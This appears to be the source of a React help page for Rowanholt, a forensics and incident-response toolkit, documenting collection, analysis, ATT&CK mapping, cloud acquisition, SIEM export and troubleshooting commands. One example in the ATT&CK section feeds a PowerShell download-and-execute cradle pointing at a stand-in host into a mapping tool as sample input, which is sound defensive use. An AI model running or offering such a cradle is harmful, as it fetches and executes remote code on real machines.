              Elrond tags each row with the techniques it shows and writes them to the case's{' '}
              <code>mitre_techniques.txt</code>; <code>--Navigator</code> builds the case's Navigator layer. The
              ATT&amp;CK tools work on their own as well:
            </p>
            <ul className="hp-cols">
              <li>Download and refresh ATT&amp;CK data</li>
              <li>Map one artefact to techniques</li>
              <li>Look up a technique</li>
              <li>Track coverage for a case</li>
              <li>Coverage as an HTML dashboard</li>
              <li>Splunk, Elastic and Navigator dashboards</li>
            </ul>
            <Code>{`python3 -m src.analysis.mitre.cli update
python3 -m src.analysis.mitre.cli info T1059.001
python3 -m src.analysis.mitre.cli map powershell_history \\
  -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
python3 -m src.analysis.mitre.coverage_cli dashboard \\
  CASE-001 /cases/CASE-001 -o coverage.html`}</Code>
          </section>

          <section>
            <h4>Containers</h4>
            <p>
              Gandalf and Elrond collect a Docker host's containers (configuration, mounts, logs, a hashed listing of
              each writable layer and copies of the executables in it) and a Kubernetes node's static pods, pod logs
              and audit log. Containers are tagged for what they can reach, such as the host's root or the Docker
              socket.
            </p>
            <Code>{`# An audit log exported from EKS, AKS or GKE
python3 -m src.analysis.rowanholt.cloud.cli k8s analyze-logs \\
  -f audit.json -o ./analysis`}</Code>
          </section>

          <section>
            <h4>Cloud</h4>
            <ul className="hp-cols">
              <li><strong>AWS:</strong> EC2 snapshots, CloudTrail</li>
              <li><strong>Azure:</strong> VM disk snapshots, Activity Log</li>
              <li><strong>GCP:</strong> Compute Engine snapshots, Cloud Logging</li>
            </ul>
            <Code>{`python3 -m src.analysis.rowanholt.cloud.cli aws acquire-logs \\
  --days 7 -o ./logs/AWS-001 --analyze
python3 -m src.analysis.rowanholt.cloud.cli aws acquire-disk \\
  -i i-1234567890abcdef0 -o ./snapshots/AWS-001 --wait
python3 -m src.analysis.rowanholt.cloud.cli gcp acquire-disk \\
  -i myinstance --zone europe-west2-a -o ./snapshots/GCP-001`}</Code>
          </section>

          <section>
            <h4>SIEMs and timelines</h4>
            <ul className="hp-cols">
              <li><strong>Splunk:</strong> <code>--Splunk</code>, the stack's own instance</li>
              <li><strong>Elastic:</strong> <code>--Elastic</code>, with Kibana</li>
              <li><strong>OpenSearch and Wazuh:</strong> <code>--OpenSearch</code>, one index per case</li>
              <li><strong>Timesketch:</strong> <code>--Timesketch</code>, a timeline per host</li>
              <li><strong>Again later:</strong> <code>--Index</code> on a finished case</li>
              <li><strong>Anything else:</strong> every table as JSONL, or CSV from the case browser</li>
            </ul>
            <p>
              Every SIEM option fails fast if the service is unreachable. There is no separate exporter; it all runs
              inside Elrond, or from a finished job in the web app.
            </p>
          </section>
        </>
      ),
    },
    workflow: {
      title: 'Workflow',
      content: (
        <>
          <section>
            <h3>An Investigation, End to End</h3>
            <p>
              From a live host to a cited report. Gandalf's archive carries its own hashes; Elrond checks them before
              it does anything else, and every row it writes can be cited from then on: by the case browser, by Aulë
              and in the report.
            </p>
            <Flow
              label="Gandalf collects, Elrond analyses, the case browser holds findings and notes, Aulë answers questions, and the report is written"
              stages={investigationStages}
              caption="Disk and memory images, captures, phone backups and Mordor datasets go straight into Elrond; the rest is the same."
            />
          </section>

          <section>
            <h4>The same from a shell</h4>
            <p>The web app runs each of these for you; they're here for scripts and for the record.</p>
            <div className="hp-shell">
              <div>
                <h5>1. Collect</h5>
                <Code>{`cd src/acquisition
sudo python3 python/gandalf.py Key Local -M \\
  -O /evidence/CASE-001/acquisitions`}</Code>
              </div>
              <div>
                <h5>2. Analyse</h5>
                <Code>{`python3 src/analysis/elrond.py CASE-001 \\
  /evidence/CASE-001/acquisitions/ /cases/CASE-001 \\
  --Gandalf --Process --Analysis --Memory \\
  --Navigator --Report`}</Code>
              </div>
              <div>
                <h5>3. Ask Aulë</h5>
                <Code>{`python3 -m src.analysis.rowanholt.ai.cli index \\
  CASE-001 /cases/CASE-001
python3 -m src.analysis.rowanholt.ai.cli query \\
  CASE-001 "What was the initial access vector?"`}</Code>
              </div>
              <div>
                <h5>4. Report, and the SIEMs</h5>
                <Code>{`cd src/analysis
python3 -m rowanholt.report /cases/CASE-001 --out ~/reports
cd ../..
python3 src/analysis/elrond.py CASE-001 /cases/CASE-001 \\
  --Index --Splunk --Elastic`}</Code>
              </div>
            </div>
            <p>Findings and notes are the case browser's alone: there is no command line for them.</p>
          </section>

          <section>
            <h4>Habits worth keeping</h4>
            <ul className="hp-cols">
              <li><strong>Key encryption:</strong> and keep the <code>.shadowfax.key</code> apart from the archive</li>
              <li><strong>Other media:</strong> <code>-O</code> to a different disk keeps Gandalf off the host's own</li>
              <li><strong>Check integrity:</strong> read <code>gandalf_integrity.jsonl</code> before trusting a host</li>
              <li><strong>Triage first:</strong> leave <code>--Timeline</code> and <code>--extractIocs</code> for a second pass</li>
              <li><strong>Leads are not verdicts:</strong> stacking rows and threat intelligence matches need an analyst</li>
              <li><strong>Confirm before reporting:</strong> only confirmed findings lead the report and the layer</li>
            </ul>
          </section>
        </>
      ),
    },
    troubleshooting: {
      title: 'Troubleshooting',
      content: (
        <>
          <section>
            <h3>Common Problems</h3>
            <div className="hp-issues">
              <div className="hp-issue">
                <h4>The stack won't come up</h4>
                <p>See which container is unhappy, then read its logs.</p>
                <Code>{`rowanholt status
rowanholt anduril status
rowanholt anduril logs backend -n 200`}</Code>
              </div>

              <div className="hp-issue">
                <h4>A job seems stalled</h4>
                <p>
                  Foremost, Plaso, end-of-collection clean-up and the result statistics can log nothing for 30
                  minutes or more. Check the worker is busy before cancelling.
                </p>
                <Code>{`rowanholt jobs status
rowanholt anduril stats celery-worker`}</Code>
              </div>

              <div className="hp-issue">
                <h4>A Linux image finishes in seconds with no output</h4>
                <p>
                  Loop devices leaked from an earlier run. List them, and release them with <code>kpartx -d</code>{' '}
                  and <code>losetup -d</code> when nothing else is mounted.
                </p>
                <Code>{`losetup -a`}</Code>
              </div>

              <div className="hp-issue">
                <h4>Mount permission errors</h4>
                <p>
                  Mounting images needs root, or the privileged worker container. Run several cases one after
                  another, not in parallel: concurrent runs share the mount points and unmount each other's images.
                </p>
              </div>

              <div className="hp-issue">
                <h4>A tool isn't found</h4>
                <p>
                  The worker image has every tool Elrond calls. Run Elrond there (the web app does), or see{' '}
                  <ExternalLink href={doc('CONFIG.md')}>CONFIG.md</ExternalLink> to install them on a host. For
                  Volatility 3 directly:
                </p>
                <Code>{`docker exec rowanholt-celery-worker \\
  vol.py -f /path/to/memory.raw windows.info`}</Code>
              </div>

              <div className="hp-issue">
                <h4>Aulë can't reach the model</h4>
                <p>
                  Ask Aulë says which: Ollama isn't running, or the model isn't pulled. The backend looks for Ollama
                  at <code>OLLAMA_HOST</code>, by default on the Docker host.
                </p>
                <Code>{`ollama list
ollama serve
ollama pull qwen3:8b`}</Code>
              </div>

              <div className="hp-issue">
                <h4>SIEM export fails</h4>
                <p>
                  Elrond checks every SIEM before it processes anything and stops if one is unreachable. Start them
                  (they're left out by <code>--testing</code>), then send a finished case again without reprocessing.
                </p>
                <Code>{`rowanholt start
python3 src/analysis/elrond.py CASE-001 /cases/CASE-001 \\
  --Index --Splunk --Elastic`}</Code>
              </div>

              <div className="hp-issue">
                <h4>"unrecognized arguments" from a module</h4>
                <p>
                  You ran a <code>python3 -m src.analysis…</code> module from inside <code>src/analysis</code>. Run it
                  from the repository root.
                </p>
              </div>
            </div>
          </section>

          <section>
            <h4>Getting help</h4>
            <ul className="hp-cols">
              <li><ExternalLink href={`${REPO}/issues`}>GitHub issues</ExternalLink>: bugs and requests</li>
              <li><ExternalLink href={doc('CLI.md#troubleshooting')}>CLI.md</ExternalLink>: more of the above</li>
              <li>Each case's <code>rowanholt_audit.log</code>: what Elrond did, and when</li>
            </ul>
          </section>
        </>
      ),
    },
  };

  return (
    <div className="journey-detail help-page">
      <section className="hero-section">
        <img
          src={heroImage}
          alt="Rowanholt"
          className="hero-image"
          style={{ transform: 'scale(0.2)', transformOrigin: 'center top' }}
        />
      </section>

      <header>
        <h2>About Rowanholt</h2>
        <p>How the parts fit together, the commands behind the web app, and what to check when something breaks.</p>
      </header>

      <div data-guide="about.docs" className="card">
        <div className="hp-tabs" role="tablist">
          {Object.keys(sections).map((key) => (
            <button
              key={key}
              role="tab"
              aria-selected={activeSection === key}
              className={`hp-tab${activeSection === key ? ' is-active' : ''}`}
              onClick={() => setActiveSection(key)}
            >
              {sections[key].title}
            </button>
          ))}
        </div>

        <div className="help-content" role="tabpanel">
          {sections[activeSection].content}
        </div>

        <div className="hp-resources">
          <h4>Additional Resources</h4>
          <ul className="hp-cols">
            <li><strong>Repository:</strong> <ExternalLink href={REPO}>github.com/cmdaltr/rowanholt</ExternalLink></li>
            <li><strong>Author:</strong> <ExternalLink href="https://github.com/cmdaltr">@cmdaltr</ExternalLink></li>
            <li><strong>Version:</strong> {VERSION}</li>
            <li><strong>Licence:</strong> MIT</li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default HelpPage;
